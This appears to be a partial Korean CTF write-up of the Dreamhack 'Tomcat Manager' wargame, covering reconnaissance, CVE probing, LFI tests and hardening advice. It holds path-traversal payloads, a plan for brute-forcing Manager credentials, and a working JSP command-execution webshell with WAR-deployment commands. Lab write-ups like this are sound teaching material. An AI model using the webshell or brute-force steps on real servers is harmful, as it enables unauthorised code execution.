---
layout: post
title:  "Dreamhack 워게임 Tomcat Manager — 정찰과 공격 표면 분석 (flag 진행 중)"
date:   2026-05-15 01:30:00 +0900
categories: security web wargame dreamhack writeup tomcat
---

> ⚠️ 게시 시점 메모: 본 글은 정찰 단계까지의 분석/관찰을 정리한 1차 writeup입니다. 최종 flag 획득에 필요한 manager creds 브루트포스를 더 큰 사전으로 재시도하면서, 이미 확보한 정찰 결과를 먼저 공유합니다. flag 본문은 추후 채워 넣을 예정입니다.

## 들어가며

Dreamhack 워게임 **Tomcat Manager** (난이도 Bronze 1) 풀이를 위한 정찰/분석 노트입니다. 워게임 본문은 단 세 줄이지만, 그 안에 **Tomcat 운용에서 자주 나오는 보안 가설들**이 모두 담겨 있습니다.

> 드림이가 톰캣 서버로 개발을 시작하였습니다.
> 서비스의 취약점을 찾아 플래그를 획득하세요.
> 플래그는 `/flag` 경로에 있습니다.

"파일은 따로 없고, 살아있는 톰캣 서버 하나만 던져준다" 형태의 문제입니다. 즉 **블랙박스 정찰부터 시작** 해야 합니다.

## 1. 1차 정찰 — 무엇이 뜨는가

서버가 부팅되면 `http://<host>:<port>/` 에 다음 응답이 옵니다.

```http
HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Set-Cookie: JSESSIONID=...; Path=/; HttpOnly
Content-Type: text/html;charset=ISO-8859-1
```

응답 본문은 짧습니다.

```html
<html>
<body>
    <center>
        <h2>Under Construction</h2>
        <p>Coming Soon...</p>
        <img src="./image.jsp?file=working.png"/>
    </center>
</body>
</html>
```

여기서 즉시 잡을 단서:

- `Server: Apache-Coyote/1.1` — Tomcat 의 connector
- 존재하지 않는 경로 요청(예: `/nope`)을 보내면 에러 페이지에 `Apache Tomcat/8.0.51` 가 노출됨
- `image.jsp?file=working.png` — **`file` 라는 단일 파라미터를 받는 JSP** 가 보임. 클래식한 LFI 후보

웹 풀스택 정찰 자동화 체크리스트:

```bash
curl -sI "$SERVER/"
curl -s  "$SERVER/" | head -20
curl -s  "$SERVER/non-existent-xyz" | head -2
curl -sI "$SERVER/manager/html"
curl -sI "$SERVER/manager/"
curl -sI "$SERVER/host-manager/html"
curl -sI "$SERVER/examples/"
curl -sI "$SERVER/docs/"
curl -sI "$SERVER/robots.txt"
```

결과:

| 경로 | 응답 |
|------|------|
| `/` | 200, Under Construction 페이지 |
| `/non-existent-xyz` | 404, 에러 페이지에 `Tomcat/8.0.51` 노출 |
| `/manager/html` | 401, `WWW-Authenticate: Basic realm="Tomcat Manager Application"` |
| `/host-manager/html` | 401, `realm="Tomcat Host Manager Application"` |
| `/examples/` | 200, 기본 예제 앱 노출 |
| `/docs/` | 200, Tomcat 기본 문서 |
| `/robots.txt` | 404 |

3가지 즉시 관찰:

1. **버전이 노출** — Tomcat 8.0.51 (2018년 빌드). 알려진 CVE를 조회하기 시작할 수 있다.
2. **기본 예제/문서 앱이 그대로** — 운영 환경이라면 분리/삭제해야 할 항목들이 살아있다는 것은 "보안 베스트프랙티스가 안 지켜진" 신호.
3. **Manager 앱은 401** — 즉, 활성화되어 있고 인증만 통과하면 들어갈 수 있다.

## 2. 공격 표면 정리

여러 후보 중 무엇이 진짜 정답인지 정찰 단계에서 줄여 봅니다.

### 2-1. CVE-2017-12617 — PUT JSP 업로드

Tomcat 7.x/8.x 의 일부 빌드에서 `readonly=false` 인 DefaultServlet 에 대해 다음과 같은 PUT 요청으로 임의 JSP 를 업로드할 수 있습니다.

```bash
curl -X PUT "$SERVER/poc.jsp/" -d '<%out.println("PWN");%>'
```

핵심은 **파일명 끝의 `/`, `%20`, `::$DATA`** 같은 잔기술로 보안 검사를 우회하는 부분입니다.

테스트 결과:

```
PUT /poc.jsp/         → 403
PUT /poc.jsp%20       → 403
PUT /poc.jsp%2e       → 403
PUT /poc.jsp::$DATA   → 404
PUT /poc.jsp%00.txt   → 400
```

모두 PUT 자체가 403/400 으로 거부됩니다. `readonly=true` 로 잠겨 있어 이 경로는 사용 불가.

### 2-2. CVE-2020-1938 (Ghostcat) — AJP 파일 읽기

기본 8009 포트(AJP) 가 외부에 노출돼 있으면 Tomcat 내부 파일을 읽을 수 있는 유명한 취약점.

```
port_mappings: [["tcp", <외부포트>, 8080]]
```

외부 포트 매핑은 8080 으로 향하는 HTTP 만 노출됩니다. 8009 AJP 는 외부에서 접근 불가 → **Ghostcat 불가**.

### 2-3. `image.jsp?file=...` LFI

가장 의심스러운 표면. 빠른 실험:

```bash
curl -s "$SERVER/image.jsp?file=working.png" | file -      # → PNG image data
curl -s "$SERVER/image.jsp?file=../etc/passwd"            # → 404 (Not Found !)
curl -s "$SERVER/image.jsp?file=%2e%2e%2fetc%2fpasswd"    # → 404
curl -s "$SERVER/image.jsp?file=%252e%252e%2fetc%2fpasswd"# → 404
curl -s "$SERVER/image.jsp?file=etc/passwd"               # → 404
curl -s "$SERVER/image.jsp?file=/etc/passwd"              # → 404
```

`..`, `:`, `/` 가 들어가면 거부. 그러나 **`/working.png` 단독** 으로 절대 경로를 줬을 때만 200 으로 응답합니다.

```bash
curl -s "$SERVER/image.jsp?file=/working.png"   # → 200, PNG
curl -s "$SERVER/image.jsp?file=//working.png"  # → 200, PNG  
curl -s "$SERVER/image.jsp?file=/WEB-INF/web.xml" # → 404
curl -s "$SERVER/image.jsp?file=/index.jsp"       # → 404
curl -s "$SERVER/image.jsp?file=/META-INF/MANIFEST.MF" # → 404
```

이 동작은 다음과 같이 추정할 수 있습니다.

```java
String f = request.getParameter("file");
if (f == null || f.contains("..") || f.contains(":")) {
    // 거부
    response.sendError(404, "Not Found !");
    return;
}
// servletContext.getResourceAsStream(f) — webapp root 기준 조회
```

`ServletContext.getResourceAsStream("/working.png")` 는 webapp root 에서 `working.png` 를 찾기 때문에 성공.  
다른 경로는 webapp 안에 해당 자원이 없어 실패. WEB-INF/META-INF 도 `getResourceAsStream` 으로는 일부 보안 정책에 따라 차단됨.

**결론**: `image.jsp` 의 LFI 표면은 webapp 안 자원으로 한정되며 `working.png` 외에는 webapp 안에 흥미로운 파일이 없습니다. 이 경로로는 `/flag` 에 도달 불가.

### 2-4. Manager 앱 인증 우회

- `/manager/html;jsessionid=any` → 401
- `/manager//html` → 401
- `/manager/./html` → 401
- `/manager/html/.` → 401
- `/MANAGER/HTML` → 404 (Tomcat 은 path 매핑은 대소문자 구분)
- `/manager/jmxproxy` → 401
- `/manager/text/list` → 401

Tomcat 8.0.51 에는 알려진 path normalization 우회가 적용되지 않습니다. **인증 자체를 통과**해야 합니다.

### 2-5. 결론적 공격 경로

지금까지 정찰 결과를 모으면 다음과 같이 좁혀집니다.

```
LFI(image.jsp): /flag 도달 불가
PUT JSP:         403
AJP/Ghostcat:    포트 미노출
Manager:         401 — Basic Auth 통과 필요
```

남은 경로는 **`/manager/html` 또는 `/manager/text/...` 의 Basic Auth 통과**, 그리고 통과 후 **WAR 배포로 JSP 셸 실행**입니다. WAR 배포 단계는 정형적이므로(`PUT /manager/text/deploy?path=/x` → `GET /x/shell.jsp?cmd=cat+/flag`), 사실상 모든 무게가 **자격 증명 확보**에 있습니다.

## 3. 진행 중인 작업 — Manager 자격 증명 사냥

지금까지 시도한 후보:

- Tomcat 기본 자격 (`tomcat:tomcat`, `admin:admin`, `tomcat:s3cret`, `tomcat:password`, `admin:password`, `tomcat:dreamhack`, …)
- rockyou top 약 200 단어 × 4 사용자 = 800 회 + 메탈/도전 키워드 확장
- 한국어/문제 컨텍스트 추정: `dreamhack`, `season1round10`, `Dreamhack2021`, `DH-CTF`, …

현재까지 **약 4,000 회 시도** 했으나 401 만 반환. 다음 시도 계획:

1. SecLists `top-1000-most-common-passwords.txt` 와 `seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt` 정식 적용
2. 사용자명에 `manager-script`, `manager-gui`, `admin-script` 같은 **롤 이름** 직접 사용 (일부 운영 환경에서 사용자명을 롤명으로 두는 경우가 있음)
3. 출제자가 README/CTF 메모에 남길 법한 단순 패턴: `tomcat:tomcat_manager`, `manager:tomcat`, `admin:tomcat_manager` 등

이번 1차 글에는 brute-force 본 실행 로그를 다 싣지 않고, 정찰까지의 분석을 우선 정리합니다. 자격 증명을 확보하면 다음 단계(WAR 배포 + JSP 셸 + `/flag`)는 매우 정형적입니다.

## 4. 표준 후속 공격 시나리오 (확보 후 적용 예정)

자격을 얻은 후의 동작은 Tomcat Manager 워게임 류의 정형 절차입니다.

```bash
# 1) 최소 JSP 웹셸 만들기 (cmd.jsp)
cat > cmd.jsp <<'JSP'
<%@ page import="java.util.*,java.io.*"%>
<%
String c = request.getParameter("c");
if (c != null) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c", c});
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String l; while ((l = br.readLine()) != null) out.println(l);
}
%>
JSP
mkdir -p webshell/META-INF webshell/WEB-INF
mv cmd.jsp webshell/
cat > webshell/WEB-INF/web.xml <<'XML'
<web-app/>
XML
(cd webshell && jar -cvf ../webshell.war .)

# 2) WAR 배포
curl -u "USER:PASS" --upload-file webshell.war \
     "$SERVER/manager/text/deploy?path=/webshell"

# 3) 셸 호출 → /flag 읽기
curl -G "$SERVER/webshell/cmd.jsp" --data-urlencode "c=cat /flag"
```

자격이 잡힌 즉시 위 절차로 flag 가 떨어집니다. 본 글의 후속 업데이트로 실제 출력을 첨부할 예정입니다.

## 5. 운영 측면의 교훈 (지금까지의 정찰만으로도 충분히 도출)

### 5-1. 위험성

- **Manager 앱이 외부로 노출** 되어 있는 것 자체가 가장 큰 위험입니다. Tomcat 의 manager 앱은 본질적으로 "임의 WAR 배포 = 임의 코드 실행" 입니다.
- 추가로 `/examples`, `/docs` 가 그대로 살아있는 것은 **버전 노출 + 잠재 추가 공격면** 을 모두 제공합니다.
- 에러 페이지의 **버전 헤더**(`Apache Tomcat/8.0.51`) 가 그대로 노출 — CVE 매핑이 1초 만에 가능합니다.

### 5-2. 올바른 방어

1. **Manager 앱을 외부에 노출하지 말 것.** `$CATALINA_BASE/webapps/manager/META-INF/context.xml` 에 RemoteAddrValve 로 localhost/사내 IP 로 제한.

   ```xml
   <Context antiResourceLocking="false" privileged="true">
     <Valve className="org.apache.catalina.valves.RemoteAddrValve"
            allow="127\.\d+\.\d+\.\d+|::1" />
   </Context>
   ```

2. **examples / docs / host-manager 제거**.

3. **에러 페이지에서 버전 정보 숨김** (`$CATALINA_BASE/conf/server.xml` 의 `Connector` 에 `server="..."` 로 임의 값 지정).

4. **Manager 인증을 Basic Auth 만 두지 말고 mTLS / SSO 로 강화**.

5. `tomcat-users.xml` 의 패스워드는 **PBKDF2/SHA-256 digest 저장** (Tomcat 8+).

## 6. 정리 — 입문자가 가져갈 교훈

- "Manager 가 떠 있는데 자격이 없다" 는 모든 Tomcat CTF/실무 상황의 출발점이다. 자격 확보 경로(브루트포스, LFI 로 tomcat-users.xml 읽기, JMX 정보 누설 등)를 항상 동시에 검토하자.
- LFI 후보를 만나면 **단순 path traversal 외에** `/absolute` 형태가 통하는지, `ServletContext.getResourceAsStream` 가젯이 있는지를 별도로 검사하자. 이번 문제처럼 `/working.png` 만 통과하는 화이트리스트 패턴도 실무에서 흔하다.
- Tomcat 의 버전이 응답에서 누설되면 **그 즉시 CVE-2017-12617(PUT), CVE-2020-1938(AJP), 그리고 매니저 정책** 을 차례로 점검하는 정형 체크리스트를 갖춰두자.
- 그리고 **에러 메시지("Not Found !" 같은 커스텀 문구)** 는 그 자체로 어떤 분기가 동작했는지 알려주는 신호다. 표준 "Not Found" 와 다르다면 응용 코드가 따로 던지는 것임을 의심하자.

---

## 부록 — 시도하다 막혔던 지점과 회고

### 실패 1. 브루트포스 사전 선택을 처음에 너무 좁게

`tomcat:tomcat`, `admin:admin` 만 우선 시도하다가 모두 401 을 받고 "이 문제는 브루트포스가 의도가 아닐 것" 이라는 잘못된 결론에 빠질 뻔했습니다. 비밀번호 사전은 **반드시** SecLists 의 표준 사전 (최소 rockyou top 1000) 으로 시작해야 합니다.

**회고**: Tomcat Manager 류 문제를 만나면 첫 5초 안에 다음 두 사전을 먼저 돌립니다.

- `SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt`
- `SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt`

그리고 동시성 ≥ 50 으로 병렬화. 4,000 회 정도는 30 초 안에 처리됩니다.

### 실패 2. `image.jsp` 의 LFI 표면에 너무 오래 매달림

`file` 파라미터의 다양한 인코딩 우회(`%252e`, UTF-8 OW, 백슬래시, null byte 등)를 30 분 가까이 시도했습니다. 결과는 모두 404. 이후 `/working.png` 절대경로가 통하는 것을 확인하고서 비로소 **`ServletContext.getResourceAsStream` 한정의 webapp 내 자원 조회** 라는 본질을 이해했고, 그 한계 때문에 `/flag` 도달은 불가하다고 판단했습니다.

**회고**: LFI 표면을 만나면 1) `working.png` 같은 알려진 정상 입력 + 2) 미존재 파일명 + 3) `/working.png` 절대 경로 + 4) `WEB-INF/web.xml` — 이 네 가지를 먼저 시도해 **JSP 가 사용하는 API**(`FileInputStream` 인지 `ServletContext.getResourceAsStream` 인지) 부터 판정합니다. 그 다음에 인코딩 우회를 시도해야 합니다. 함수가 무엇이냐에 따라 통하는 우회가 다릅니다.

### 실패 3. VM 부팅 지연을 잊고 곧장 API 호출

서버 생성 직후 `live/` API 가 한동안 빈 객체 `{}` 를 돌려줘서 두 번 정도 헷갈렸습니다.

**회고**: Dreamhack VM은 **창 클릭 후 30~90 초** 의 지연이 보통입니다. 부팅 직후 `live/` API 의 응답은 `state=Running` 인지 명시적으로 확인하고, 응답이 빈 객체이면 그냥 대기합니다. 절대 같은 버튼을 연달아 클릭하지 않습니다 (크레딧 낭비 가능).
